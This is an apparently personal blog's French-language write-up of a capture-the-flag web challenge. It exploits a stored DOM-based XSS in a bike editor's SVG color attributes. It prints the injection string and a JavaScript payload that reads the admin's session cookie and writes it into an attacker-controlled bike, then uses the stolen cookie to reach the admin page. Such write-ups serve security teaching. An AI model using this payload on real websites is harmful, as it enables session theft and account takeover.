---
title: "🇫🇷 PWNME - PimpMyBicycle"
date: 2022-07-07
draft: false
tags: [web]
# image: "/image/blog-pic.jpg"
description: "XSS DOM-based dans un SVG"
showDate: true          # to enable/disable showing dates
math: true              # to enable showing equations (katex)
---

[Go back to write-ups list](../)

*This write-up is in French because it's a French CTF, sowwy*

> **Category:** Web
> 
> **Creator:** Eteck
> 
> **Description:**
> 
> Your friend just had an idea: allow everyone to create the bike of their dream ! He asks you to verify if his website is secure, since you're the best pentester he knows.
>
> **Find a way to access the admin page**
>
> *note: admin doesn't have access to the internet ! He is behind a very restrictive firewall, and he can only be on his own website*

Je vais sauter la partie où on crée un compte pour aller directement à l'interface intéressante : l'interface où l'on peut pimper notre vélo !

![Page web](/image/pwnme22/pmb_intro.png)

Au delà de l'éditeur de vélo à gauche, on a 3 fonctionnalités : créer un vélo aléatoire, sauvegarder un nouveau vélo et sauvegarder le vélo actuel (le modifier en quelques sortes).

En lisant le Javascript de la page, on peut trouver les fonctions qui s'occupent d'enregistrer le vélo :

```js
function saveBuild() {
  let result = [];
  for (const customElement of editor.getCustomElements()) {
    result.push({
      id: customElement.element.id,
      slot: customElement.slot.id,
      colors: customElement.colors,
    });
  }
  return JSON.stringify(result);
}

function save() {
  $.post("/?page=preview&action=saveBike", { data: saveBuild() }).then(
    (id) => (document.location = "/?page=preview&id=" + id)
  );
}

function edit() {
  $.post("/?page=preview&action=editBike&id=" + getParamId(), {
    data: saveBuild(),
  }).then(() => document.location.reload(false));
}
```

Comme on peut s'en douter, les paramètres de cette classe `CustomElement` qui sont sauvegardés (notamment la couleur) seront ensuite réinjectés dans la page lorsque que l'on charge un vélo. Pour vérifier cette hypothèse, j'ai tenté d'injecter du HTML dans un des attribut couleur, puis de sauvegarder le vélo.

```js
editor.getCustomElements()[1].colors[0] = '"></path></svg><span>coucou les gens</span>'
```

Et bingo ! Le texte est apparu à la place de la roue !

![DOM based](/image/pwnme22/pmb_dom.png)

Si on met une balise `<script>` à la place du `<span>`, on peut facilement deviner que le script sera exécuté. Il en est de même sur la page de preview du vélo que l'admin consulte lorsqu'on lui soumet un vélo.

Réfléchissons maintenant à un script qui pourrait récupérer le cookie de session de l'admin. Beaucoup se sont fait avoir, mais j'ai lu la description donc je sais qu'on ne peux pas l'envoyer à un site externe. Par contre, on peut probablement demander à l'admin d'éditer un de nos vélos. J'ai donc récupérer le JSON qui est envoyé lorsqu'on sauvegarde un vélo, et j'ai écrit un script pour y intégrer le cookie de session :

```js
let data = JSON.stringify([{
    "id":"roue1",
    "slot":0,
    "colors": ["\"></path></svg><h1>Pour Cyxo : " + document.cookie + "</h1>","#FFFFFF"]
}]);

$.post("/?page=preview&action=editBike&id=150", {
    data: data,
}).then(() => document.location.reload(false));
```

*150 étant l'id d'un vélo aléatoire créé précédemment*

En rendant ce payload moche et sur une seule ligne, on peut l'insérer dans une balise script de notre vélo malveillant et l'envoyer en production à l'administrateur. Après un cours délai, l'admin nous informe gentillement que notre vélo va être créé.

![Nice admin, nice](/image/pwnme22/pmb_admin.png)

Ce qui veut dire que l'admin a exécuté notre script ! On peut alors retourner sur le fameux vélo #150, et surprise :

![Miam les cookies](/image/pwnme22/pmb_cookie.png)

En volant ce cookie, on a désormais accès à l'interface d'administration et au flag !

[Go back to write-ups list](../)